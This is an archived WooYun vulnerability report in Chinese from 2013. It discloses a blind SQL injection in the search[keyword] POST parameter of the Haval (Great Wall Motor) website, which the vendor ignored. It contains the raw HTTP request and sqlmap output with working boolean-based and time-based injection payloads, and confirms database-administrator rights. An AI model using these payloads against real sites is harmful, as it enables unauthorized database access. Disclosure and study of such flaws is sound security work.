wybug_title: 长城汽车之哈佛官网SQL盲注
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2013-10-18：	细节已通知厂商并且等待厂商处理中									2013-10-23：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 长城汽车之哈佛官网SQL盲注，权限很高。 详细说明：  请求类型：POST注入页面：http://www.haval.com.cn/haval_newslist.html注入参数：search[keyword]
POST /haval_newslist.html HTTP/1.1Content-Length: 71Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://www.haval.com.cn:80/Cookie: ASPSESSIONIDSCSDTDCR=GOEFFDMCKCENIGBCFMAKPEFP; ASPSESSIONIDACBATAQC=MOGHFDADCPMEJIHCMPOBIJPEHost: www.haval.com.cnConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*p=1&search%5bkeyword%5d=1
   漏洞证明：  
[08:45:17] [INFO] parsing HTTP request from '1.txt'[08:45:17] [INFO] resuming back-end DBMS 'microsoft sql server' [08:45:17] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: search[keyword]    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause    Payload: p=1&search[keyword]=-5495') OR (3753=3753) AND ('sYuZ' LIKE 'sYuZ    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)    Payload: p=1&search[keyword]=-1475') OR 1179=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ('ImlK' LIKE 'ImlK---[08:45:18] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windowsweb application technology: ASP.NET 4.0.30319, ASP.NETback-end DBMS: Microsoft SQL Server 2012[08:45:18] [INFO] testing if current user is DBA[08:45:19] [WARNING] reflective value(s) found and filtering outcurrent user is DBA:    True[08:45:20] [INFO] fetched data logged to text files under '/home/santoku/pen/sqlmap/output/www.haval.com.cn'
上传不了截图，只有这样。   修复方案：  过滤参数"search[keyword]"   版权声明：转载请注明来源 lpcdma@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-10-23 18:52 厂商回复：  最新状态： 暂无
